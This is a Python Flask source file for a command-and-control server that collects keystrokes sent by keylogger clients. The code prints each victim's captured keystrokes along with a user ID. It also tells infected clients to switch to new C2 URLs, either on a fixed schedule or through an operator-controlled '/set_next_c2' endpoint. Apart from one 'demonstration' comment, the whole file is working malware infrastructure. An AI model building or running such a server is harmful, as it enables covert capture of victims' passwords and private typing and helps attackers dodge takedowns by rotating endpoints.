# simple_log_receiver.py

# This is a very basic Flask web server designed to receive POST requests
# containing keylogger data. It prints the received data to the console.
# It also demonstrates sending a 'new_c2_url' back to the client,
# with a new feature to manually control the next C2 URL advertisement.

# To run this server:
# 1. Install Flask: pip install Flask
# 2. Save this code as simple_log_receiver.py
# 3. Run from your terminal: python simple_log_receiver.py

from flask import Flask, request, jsonify

app = Flask(__name__)

# Global variable to simulate changing C2 URL (for demonstration purposes)
# In a real C2, this would be determined by attacker actions.
_request_count = 0
# New global variable for manually setting the next C2 URL to advertise
_manual_next_c2_url = None

@app.route('/upload_logs', methods=['POST'])
def upload_logs():
    global _request_count, _manual_next_c2_url
    _request_count += 1

    if request.is_json:
        data = request.get_json()
        keystrokes = data.get('keystrokes')
        user_id = data.get('user_id', 'N/A')

        if keystrokes:
            print(f"\n--- Received Keystrokes from {user_id} (Request Count: {_request_count}) ---")
            print(keystrokes)
            print("-------------------------------------------\n")

            response_data = {"message": "Logs received successfully"}

            # --- Manual C2 URL Advertisement Logic (takes precedence) ---
            if _manual_next_c2_url:
                response_data["new_c2_url"] = _manual_next_c2_url
                print(f"[SERVER ACTION] Manually advertising new C2 URL: {_manual_next_c2_url}")
                _manual_next_c2_url = None # Clear after sending to advertise only once
            # --- Automatic (Demonstration) C2 URL Advertisement Logic (fallback) ---
            elif _request_count == 1:
                response_data["new_c2_url"] = "http://localhost:8000/upload_logs_v2"
                print(f"[SERVER ACTION] Automatically advertising new C2 URL: {response_data['new_c2_url']}")
            elif _request_count == 2:
                response_data["new_c2_url"] = "http://localhost:8000/final_upload_target"
                print(f"[SERVER ACTION] Automatically advertising new C2 URL: {response_data['new_c2_url']}")
            else:
                pass # No new C2 URL to advertise

            return jsonify(response_data), 200
        else:
            return jsonify({"error": "No 'keystrokes' data found in payload"}), 400
    else:
        return jsonify({"error": "Request must be JSON"}), 400

@app.route('/upload_logs_v2', methods=['POST'])
def upload_logs_v2():
    global _manual_next_c2_url # Allow checking/setting for consistency
    if request.is_json:
        data = request.get_json()
        keystrokes = data.get('keystrokes')
        user_id = data.get('user_id', 'N/A')
        print(f"\n--- Received Keystrokes on V2 Endpoint from {user_id} ---")
        print(keystrokes)
        print("-------------------------------------------\n")

        response_data = {"message": "Logs received successfully on V2"}
        if _manual_next_c2_url:
            response_data["new_c2_url"] = _manual_next_c2_url
            print(f"[SERVER ACTION] Manually advertising new C2 URL from V2: {_manual_next_c2_url}")
            _manual_next_c2_url = None
        return jsonify(response_data), 200
    return jsonify({"error": "Invalid request to V2 endpoint"}), 400

@app.route('/final_upload_target', methods=['POST'])
def final_upload_target():
    global _manual_next_c2_url # Allow checking/setting for consistency
    if request.is_json:
        data = request.get_json()
        keystrokes = data.get('keystrokes')
        user_id = data.get('user_id', 'N/A')
        print(f"\n--- Received Keystrokes on FINAL Endpoint from {user_id} ---")
        print(keystrokes)
        print("-------------------------------------------\n")

        response_data = {"message": "Logs received successfully on FINAL target"}
        if _manual_next_c2_url:
            response_data["new_c2_url"] = _manual_next_c2_url
            print(f"[SERVER ACTION] Manually advertising new C2 URL from FINAL: {_manual_next_c2_url}")
            _manual_next_c2_url = None
        return jsonify(response_data), 200
    return jsonify({"error": "Invalid request to FINAL endpoint"}), 400

@app.route('/set_next_c2', methods=['GET'])
def set_next_c2():
    """
    Allows the operator to manually set the next C2 URL to be advertised.
    Access via GET request with a 'url' query parameter:
    e.g., http://localhost:8000/set_next_c2?url=http://your.new.domain.com/logs
    """
    global _manual_next_c2_url
    new_url = request.args.get('url')
    if new_url:
        _manual_next_c2_url = new_url.strip()
        print(f"\n[OPERATOR ACTION] Next C2 URL set to: {_manual_next_c2_url}")
        return jsonify({"status": "success", "message": f"Next C2 URL set to: {_manual_next_c2_url}"}), 200
    else:
        return jsonify({"status": "error", "message": "Please provide a 'url' query parameter."}), 400

@app.route('/')
def index():
    return "Log Receiver Server is running. Send POST requests to /upload_logs. Use /set_next_c2?url=<new_url> to manually redirect."

if __name__ == '__main__':
    print("[*] Starting Flask Log Receiver Server...")
    print(f"[*] Initial Listening for POST requests at http://localhost:8000/upload_logs")
    print(f"[*] Automatic redirects: /upload_logs_v2, then /final_upload_target.")
    print(f"[*] To manually set next C2 URL, visit: http://localhost:8000/set_next_c2?url=http://<YOUR_NEW_URL>")
    app.run(host='0.0.0.0', port=8000, debug=False)
